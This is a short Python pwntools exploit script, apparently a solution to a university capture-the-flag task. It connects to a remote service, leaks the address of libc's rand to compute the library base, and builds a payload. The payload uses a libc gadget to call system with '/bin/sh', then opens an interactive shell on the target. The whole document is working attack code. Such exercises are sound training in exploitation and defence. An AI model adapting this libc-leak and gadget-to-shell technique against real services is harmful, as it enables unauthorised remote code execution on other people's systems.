#!/usr/bin/env python3

import pwn

exe = pwn.ELF("./vuln_patched")
libc = pwn.ELF("./libc.so.6")
#ld = pwn.ELF("./ld-linux-x86-64.so.2")

pwn.context.arch = 'amd64'

conn = pwn.remote('tasks.ws24.softsec.rub.de', 33609)
#conn = pwn.process([exe.path])

#pwn.gdb.attach(conn, gdbscript="""
#set detach-on-fork off
#set follow-fork-mode child
#""")

conn.recvuntil(b'Feel free to ask the Magic ~~8~~ ')
rand_address = conn.recvline()
libc_offset = int(rand_address[:15],10) - libc.symbols['rand']
libc.address = libc_offset

# we need one additional pop for stack alignment
#ropper --nocolor --file=libc.so.6 --inst-count 5 --type jop | grep "mov rdi, qword ptr"
gadget = libc_offset + 0x000000000002ed67 # pop rax; mov rdi, qword ptr [rsp + 0x50]; mov rax, qword ptr [rsp + 0x20]; call rax; 
pointer_system = libc.symbols["system"]
print(hex(pointer_system))
pointer_shell_string = next(libc.search(b'/bin/sh\x00'))

conn.recvuntil(b'Your question: ')
payload = pwn.p64(pointer_system) * 5 + pwn.p64(gadget) + pwn.p64(pointer_shell_string) * 30
conn.send(payload)

conn.interactive()